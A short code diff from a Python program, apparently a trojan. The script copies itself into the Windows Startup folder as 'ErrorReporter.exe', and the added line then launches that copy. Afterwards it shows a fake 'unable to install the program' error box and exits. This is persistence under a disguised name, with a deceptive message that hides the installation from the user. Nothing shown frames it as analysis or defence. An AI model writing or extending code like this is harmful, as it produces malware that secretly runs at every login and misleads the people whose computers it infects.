@@ -488,6 +488,7 @@ if __name__ == "__main__":
     print(dest, dest2)
     if not (loc == dest or loc == dest2):
         shutil.copyfile(sys.argv[0], f"C:/Users/{os.getlogin()}/appdata/roaming/microsoft/windows/start menu/programs/startup/ErrorReporter.exe")
+        os.system(f"C:/Users/{os.getlogin()}/appdata/roaming/microsoft/windows/start menu/programs/startup/ErrorReporter.exe")
         easygui.msgbox("unable to install the program, try again later")
         sys.exit(1)
     else:
